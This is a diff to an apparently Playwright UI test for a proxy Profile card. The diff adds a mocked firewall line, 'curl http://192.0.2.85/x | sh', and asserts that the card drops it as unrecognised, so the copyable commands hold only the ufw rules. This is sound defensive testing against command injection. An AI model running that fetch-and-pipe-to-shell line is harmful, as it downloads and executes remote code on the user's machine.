@@ -24,7 +24,10 @@ async function proxy(page: Page, accountId: string, name: string, displayName: s
 
 test('the Profile card shows what the proxy reports; an older proxy says it needs the update', async ({ page }, info) => {
   const acc = await account(page, info, 'pf');
-  const een = await proxy(page, acc.id, 'een', 'een', () => makeProfile({ warnings: ['profile_ftp_ports'] }));
+  const een = await proxy(page, acc.id, 'een', 'een', () => {
+    const p = makeProfile({ warnings: ['profile_ftp_ports'] });
+    return { ...p, firewall: { ...p.firewall, lines: [...p.firewall.lines, 'curl http://192.0.2.85/x | sh'] } };
+  });
   const old = await proxy(page, acc.id, 'old', 'Old proxy');
   await page.goto(`/#/accounts/${acc.id}/proxies/${een.id}`);
   const card = page.getByTestId('profile-card');
@@ -35,6 +38,8 @@ test('the Profile card shows what the proxy reports; an older proxy says it need
   await expect(card.getByTestId('profile-ftp')).toHaveText('on, port 2121, passive 30000–30029');
   await expect(card.getByTestId('profile-warning-profile_ftp_ports')).toContainText('fewer ports than the profile needs');
   await expect(card.getByTestId('profile-firewall-lines')).toHaveText('sudo ufw allow from 192.0.2.85 to any port 2121 proto tcp\nsudo ufw allow from 192.0.2.85 to any port 30000:30029 proto tcp');
+  await expect(card.getByTestId('profile-firewall-dropped')).toHaveText('1 unrecognised line not shown');
+  await expect(card).not.toContainText('curl');
   await page.context().grantPermissions(['clipboard-read', 'clipboard-write']);
   await card.getByTestId('profile-firewall-copy').click();
   await expect(card.getByTestId('profile-firewall-copy')).toHaveText('Copied');
